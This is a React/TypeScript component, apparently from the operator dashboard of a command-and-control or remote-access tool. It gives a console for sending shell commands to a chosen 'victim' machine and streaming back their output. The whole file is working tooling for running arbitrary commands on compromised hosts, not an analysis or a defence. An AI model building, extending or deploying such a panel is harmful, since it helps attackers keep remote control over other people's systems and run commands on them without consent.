'use client';
import { useEffect, useState } from 'react';
import { Terminal } from 'lucide-react';
import { toast } from 'sonner';
import { useApi, mutate } from '@/hooks/useApi';
import { useLiveContext } from '@/components/live-provider';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Empty, SkeletonRows } from '@/components/ui/table';
import { Badge } from '@/components/ui/badge';
import type { Task } from '@/lib/types';
import { dateTime } from '@/lib/format';

export function ConsolePanel({ victimId }: { victimId: string }) {
  const [command, setCommand] = useState('');
  const [busy, setBusy] = useState(false);
  const { data, loading, refresh } = useApi<{ items: Task[] }>(`/tasks?victim=${victimId}&name=shell&limit=50`, { pollMs: 4000 });
  const live = useLiveContext();
  const last = live.events[0];
  useEffect(() => {
    if (last?.type === 'task.update') refresh();
  }, [last?.at]); // eslint-disable-line react-hooks/exhaustive-deps

  async function run(event: React.FormEvent) {
    event.preventDefault();
    if (!command.trim() || busy) return;
    setBusy(true);
    try {
      await mutate('/tasks', 'POST', { victim_ids: [victimId], name: 'shell', params: { command }, timeout_sec: 90 });
      setCommand('');
      refresh();
    } catch (caught) {
      toast.error(caught instanceof Error ? caught.message : 'command failed');
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="flex h-[520px] flex-col">
      <div className="flex-1 overflow-y-auto bg-black/40 p-3 font-mono text-xs">
        {loading ? <SkeletonRows rows={6} cols={2} /> : (data?.items ?? []).length === 0 ? <Empty title="No commands yet" hint="The output streams into this pane." /> : (
          data!.items.slice().reverse().map((task) => (
            <div key={task.id} className="mb-2">
              <p className="text-muted">$ {String(task.params.command)} <span className="ml-2 text-2xs text-muted/60">{dateTime(task.createdAt)} · {task.status} · {live.events.length} evt</span></p>
              <pre className="whitespace-pre-wrap break-all text-ink/90">{task.result ? String((task.result as { output?: string }).output ?? '') : task.error ?? (task.status === 'queued' ? 'queued…' : task.status)}</pre>
            </div>
          ))
        )}
      </div>
      <form onSubmit={run} className="flex items-center gap-2 border-t border-line p-2">
        <Terminal className="h-3.5 w-3.5 text-muted" />
        <Input value={command} onChange={(event) => setCommand(event.target.value)} placeholder="whoami" className="h-8 border-0 bg-transparent font-mono focus-visible:ring-0" />
        <Badge tone={busy ? 'warn' : 'default'}>{busy ? 'sending' : 'idle'}</Badge>
        <Button size="sm" loading={busy} disabled={busy || !command.trim()}>run</Button>
      </form>
    </div>
  );
}
